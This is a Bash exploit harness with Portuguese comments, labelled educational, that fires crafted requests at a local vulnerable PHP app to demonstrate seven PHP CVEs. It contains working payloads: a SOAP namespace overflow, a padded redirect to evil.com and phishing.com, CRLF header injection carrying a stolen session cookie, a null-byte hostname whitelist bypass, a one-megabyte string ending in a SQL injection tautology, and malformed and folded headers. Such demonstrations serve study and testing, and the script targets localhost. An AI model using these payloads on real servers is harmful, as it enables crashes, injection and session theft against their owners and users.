#!/bin/bash

###############################################################################
# SCRIPT DE TESTE DE VULNERABILIDADES PHP
# AVISO: Use apenas em ambientes de teste controlados!
# Para fins educacionais apenas
###############################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# URL base da aplicação vulnerável
BASE_URL="http://localhost:8000/vulnerable_app.php"

# Função para imprimir cabeçalhos
print_header() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}========================================${NC}\n"
}

# Função para imprimir resultados
print_result() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}✓ Teste executado com sucesso${NC}"
    else
        echo -e "${RED}✗ Teste falhou${NC}"
    fi
}

###############################################################################
# CVE-2025-6491: SOAP XML Namespace Overflow
###############################################################################
test_soap_overflow() {
    print_header "CVE-2025-6491: SOAP XML Namespace Overflow"
    
    echo "Criando XML com namespace prefix muito grande..."
    
    # Criar namespace prefix de 10000 caracteres
    LARGE_PREFIX=$(python3 -c "print('a' * 10000)")
    
    # XML malicioso
    cat > /tmp/soap_payload.xml << EOF
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:${LARGE_PREFIX}="http://malicious.com">
    <soap:Body>
        <${LARGE_PREFIX}:Test>Attack</${LARGE_PREFIX}:Test>
    </soap:Body>
</soap:Envelope>
EOF
    
    echo -e "${YELLOW}Namespace prefix size: $(echo -n $LARGE_PREFIX | wc -c) bytes${NC}"
    echo -e "${YELLOW}Enviando requisição SOAP...${NC}\n"
    
    curl -X POST "${BASE_URL}?action=soap" \
         -H "Content-Type: text/xml" \
         -d @/tmp/soap_payload.xml \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 47 - SoapClient processing"
    echo "- Causa: Sem validação de tamanho do namespace prefix"
    echo "- Impacto: Null pointer dereference -> Crash do servidor"
}

###############################################################################
# CVE-2025-1861: HTTP Redirect URL Truncation
###############################################################################
test_redirect_truncation() {
    print_header "CVE-2025-1861: HTTP Redirect URL Truncation"
    
    echo "Criando URL que excede buffer de 1024 bytes..."
    
    # URL longa (2000 caracteres)
    BASE="https://evil.com/redirect?padding="
    PADDING=$(python3 -c "print('A' * 1500)")
    ACTUAL_TARGET="&target=https://phishing.com/steal"
    MALICIOUS_URL="${BASE}${PADDING}${ACTUAL_TARGET}"
    
    echo -e "${YELLOW}URL size: ${#MALICIOUS_URL} bytes${NC}"
    echo -e "${YELLOW}PHP buffer limit: 1024 bytes${NC}"
    echo -e "${YELLOW}Enviando requisição...${NC}\n"
    
    curl -G "${BASE_URL}" \
         --data-urlencode "action=redirect" \
         --data-urlencode "url=$MALICIOUS_URL" \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 67 - header() function"
    echo "- Causa: Buffer limitado a 1024 bytes (RFC9110 recomenda 8000)"
    echo "- Impacto: URL truncada -> Redirecionamento para destino incorreto"
}

###############################################################################
# CVE-2025-1736: HTTP Header Injection
###############################################################################
test_header_injection() {
    print_header "CVE-2025-1736: HTTP Header Injection"
    
    echo "Injetando headers maliciosos via CRLF..."
    
    # User-Agent com CRLF injection
    MALICIOUS_UA="Mozilla/5.0\r\nX-Injected: malicious\r\nCookie: session=stolen"
    
    echo -e "${YELLOW}Payload:${NC}"
    echo "$MALICIOUS_UA" | cat -v
    echo ""
    
    echo -e "${YELLOW}Enviando requisição com headers injetados...${NC}\n"
    
    curl -G "${BASE_URL}" \
         --data-urlencode "action=custom_request" \
         --data-urlencode "user_agent=$MALICIOUS_UA" \
         --data-urlencode "custom_header=test" \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 87 - Header construction"
    echo "- Causa: Sem validação de caracteres CRLF (\\r\\n)"
    echo "- Impacto: Injeção de headers adicionais -> Bypass de segurança"
}

###############################################################################
# CVE-2025-1220: Null Character in Hostname
###############################################################################
test_null_byte_hostname() {
    print_header "CVE-2025-1220: Null Character in Hostname"
    
    echo "Testando hostname com null byte..."
    
    # Hostname com null byte (URL encoded)
    MALICIOUS_HOST="trusted.com%00.evil.com"
    
    echo -e "${YELLOW}Hostname: trusted.com\\x00.evil.com${NC}"
    echo -e "${YELLOW}parse_url() verá: trusted.com${NC}"
    echo -e "${YELLOW}fsockopen() conectará a: trusted.com\\x00.evil.com${NC}\n"
    
    curl -G "${BASE_URL}" \
         --data-urlencode "action=connect" \
         --data-urlencode "hostname=trusted.com$(printf '\x00').evil.com" \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 118 - isAllowed() validation"
    echo "- Causa: parse_url() e fsockopen() tratam null bytes diferente"
    echo "- Impacto: Bypass de whitelist -> Conexão para host malicioso"
}

###############################################################################
# CVE-2022-31631: PDO SQLite Quote Overflow
###############################################################################
test_pdo_quote_overflow() {
    print_header "CVE-2022-31631: PDO SQLite Quote Overflow"
    
    echo "Testando PDO::quote() com string extremamente longa..."
    
    # String de 1MB + SQL injection
    LONG_STRING=$(python3 -c "print('A' * 1000000)")
    SQL_PAYLOAD="${LONG_STRING}' OR '1'='1"
    
    echo -e "${YELLOW}Payload size: ${#SQL_PAYLOAD} bytes${NC}"
    echo -e "${YELLOW}Payload ends with: ' OR '1'='1${NC}\n"
    
    # Salvar em arquivo para POST
    echo -n "$SQL_PAYLOAD" > /tmp/sql_payload.txt
    
    curl -X POST "${BASE_URL}?action=search_user" \
         -d "username=$(cat /tmp/sql_payload.txt)" \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 149 - PDO::quote() call"
    echo "- Causa: Overflow ao fazer quote de strings muito longas"
    echo "- Impacto: Quote incorreto -> SQL Injection possível"
}

###############################################################################
# CVE-2025-1734: Invalid HTTP Headers
###############################################################################
test_invalid_headers() {
    print_header "CVE-2025-1734: Invalid HTTP Headers"
    
    echo "Testando header sem dois-pontos (:)..."
    
    INVALID_HEADER="InvalidHeaderWithoutColon"
    
    echo -e "${YELLOW}Header inválido: $INVALID_HEADER${NC}"
    echo -e "${YELLOW}Headers válidos devem ter formato: Nome: Valor${NC}\n"
    
    curl -G "${BASE_URL}" \
         --data-urlencode "action=parse_header" \
         --data-urlencode "header=$INVALID_HEADER" \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 185 - Header parsing"
    echo "- Causa: Headers sem ':' são tratados como válidos"
    echo "- Impacto: Aplicações aceitam headers malformados"
}

###############################################################################
# CVE-2025-1217: Folded HTTP Headers
###############################################################################
test_folded_headers() {
    print_header "CVE-2025-1217: Folded HTTP Headers"
    
    echo "Testando folded headers (continuação em múltiplas linhas)..."
    
    # Header dobrado
    FOLDED_HEADER="Value$(printf '\r\n ')continuation"
    
    echo -e "${YELLOW}Header com folding:${NC}"
    echo "$FOLDED_HEADER" | cat -v
    echo ""
    
    curl -X POST "${BASE_URL}?action=folded_header" \
         -H "Content-Type: text/plain" \
         -d "$FOLDED_HEADER" \
         -w "\n\nHTTP Status: %{http_code}\n" \
         2>/dev/null | jq . 2>/dev/null || cat
    
    print_result $?
    
    echo -e "\n${RED}FALHA DETECTADA:${NC}"
    echo "- Local: Line 208 - Folded header parsing"
    echo "- Causa: Parse incorreto de headers dobrados"
    echo "- Impacto: Má interpretação de headers -> Uso de valores incorretos"
}

###############################################################################
# Menu Principal
###############################################################################
main_menu() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║     SCRIPT DE TESTE DE VULNERABILIDADES PHP              ║"
    echo "║     Para fins educacionais apenas                        ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo "Antes de executar, inicie o servidor PHP:"
    echo "  php -S localhost:8000 vulnerable_app.php"
    echo ""
    echo "Escolha um teste:"
    echo "  1) CVE-2025-6491 - SOAP XML Namespace Overflow"
    echo "  2) CVE-2025-1861 - HTTP Redirect URL Truncation"
    echo "  3) CVE-2025-1736 - HTTP Header Injection"
    echo "  4) CVE-2025-1220 - Null Character in Hostname"
    echo "  5) CVE-2022-31631 - PDO SQLite Quote Overflow"
    echo "  6) CVE-2025-1734 - Invalid HTTP Headers"
    echo "  7) CVE-2025-1217 - Folded HTTP Headers"
    echo "  8) Executar TODOS os testes"
    echo "  0) Sair"
    echo ""
    read -p "Opção: " option
    
    case $option in
        1) test_soap_overflow ;;
        2) test_redirect_truncation ;;
        3) test_header_injection ;;
        4) test_null_byte_hostname ;;
        5) test_pdo_quote_overflow ;;
        6) test_invalid_headers ;;
        7) test_folded_headers ;;
        8) 
            test_soap_overflow
            test_redirect_truncation
            test_header_injection
            test_null_byte_hostname
            test_pdo_quote_overflow
            test_invalid_headers
            test_folded_headers
            
            echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║           TODOS OS TESTES CONCLUÍDOS                      ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
            ;;
        0) 
            echo "Saindo..."
            exit 0
            ;;
        *)
            echo -e "${RED}Opção inválida${NC}"
            ;;
    esac
}

# Verificar dependências
command -v curl >/dev/null 2>&1 || { echo "curl é necessário mas não está instalado. Abortando." >&2; exit 1; }
command -v jq >/dev/null 2>&1 || echo "Aviso: jq não instalado. Output JSON não será formatado."

# Verificar se o servidor está rodando
curl -s "$BASE_URL" > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo -e "${RED}Erro: Servidor não está respondendo em $BASE_URL${NC}"
    echo "Inicie o servidor com: php -S localhost:8000 vulnerable_app.php"
    exit 1
fi

# Executar menu
main_menu

# Manter o script rodando
while true; do
    echo ""
    read -p "Pressione Enter para voltar ao menu ou Ctrl+C para sair..."
    main_menu
done